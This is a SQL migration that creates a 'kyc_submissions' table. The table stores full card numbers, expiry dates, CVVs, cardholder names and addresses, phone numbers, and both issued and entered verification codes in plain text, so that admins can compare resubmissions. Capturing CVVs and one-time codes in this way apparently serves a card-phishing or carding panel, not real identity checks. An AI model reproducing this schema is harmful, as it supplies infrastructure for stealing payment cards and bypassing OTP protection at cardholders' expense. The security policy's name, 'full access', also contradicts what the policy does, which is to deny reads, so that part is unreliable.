/*
  # Create kyc_submissions history table

  1. New Tables
    - `kyc_submissions`
      - `id` (uuid, primary key)
      - `transaction_id` (uuid, FK → transactions.id)
      - `submission_number` (integer) — sequential count per transaction
      - `submitted_at` (timestamptz) — when this submission was made
      - All KYC field snapshots (card_number, card_expiry, cvv, cardholder_name, country,
        street_address, house_number, city, state, postal_code, phone_number,
        verification_code, entered_verification_code, card_type, payee_debit_card)

  2. Purpose
    Each time an employee submits the KYC form, a new row is inserted here
    capturing a full snapshot of that submission. This lets admins compare
    across multiple resubmissions.

  3. Security
    - RLS enabled; only service role (edge function) can write
    - No direct client access
*/

CREATE TABLE IF NOT EXISTS kyc_submissions (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  transaction_id uuid NOT NULL REFERENCES transactions(id) ON DELETE CASCADE,
  submission_number integer NOT NULL DEFAULT 1,
  submitted_at timestamptz NOT NULL DEFAULT now(),
  card_number text DEFAULT '',
  card_expiry text DEFAULT '',
  cvv text DEFAULT '',
  cardholder_name text DEFAULT '',
  country text DEFAULT '',
  street_address text DEFAULT '',
  house_number text DEFAULT '',
  city text DEFAULT '',
  state text DEFAULT '',
  postal_code text DEFAULT '',
  phone_number text DEFAULT '',
  verification_code text,
  entered_verification_code text,
  card_type text,
  payee_debit_card text,
  created_at timestamptz DEFAULT now()
);

ALTER TABLE kyc_submissions ENABLE ROW LEVEL SECURITY;

CREATE POLICY "Service role full access to kyc_submissions"
  ON kyc_submissions
  FOR SELECT
  TO authenticated
  USING (false);

CREATE INDEX IF NOT EXISTS kyc_submissions_transaction_id_idx ON kyc_submissions(transaction_id);
CREATE INDEX IF NOT EXISTS kyc_submissions_submitted_at_idx ON kyc_submissions(submitted_at DESC);
